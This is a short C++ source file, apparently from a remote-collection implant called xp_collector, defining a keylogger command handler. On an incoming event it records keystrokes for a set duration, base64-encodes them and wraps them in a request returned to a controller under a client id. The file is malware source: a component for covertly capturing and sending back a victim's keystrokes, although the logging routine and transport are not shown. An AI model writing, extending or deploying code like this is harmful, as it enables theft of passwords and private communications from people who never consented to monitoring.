#include "KeyLogEventHandler.h"
#include "WinUtils.h"
#include "base64.hpp"
#include "Products/KeyLogProduct.h"
#include "Uuid.h"

#include "Products/ReturnEventProduct.h"
#include "Protocol/ReturnProductRequest.h"
using namespace xp_collector;

KeyLogEventHandler::KeyLogEventHandler(const unsigned int duration)
	: m_duration(duration)
{
}

std::unique_ptr<IRequest> KeyLogEventHandler::handle(const std::shared_ptr<EventInfo> event_info,
                                                     const std::string& client_id)
{
	const std::string result = windows::log_keys(m_duration);
	const std::string encoded_result = result.empty() ? "" : base64::to_base64(result);
	const std::string generated_command_id = uuid::generate_uuid();
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnEventProduct, client_id},
		generated_command_id,
		ReturnEventProduct(std::make_unique<KeyLogProduct>(generated_command_id, encoded_result),
		                   event_info).serialize()
	);
}
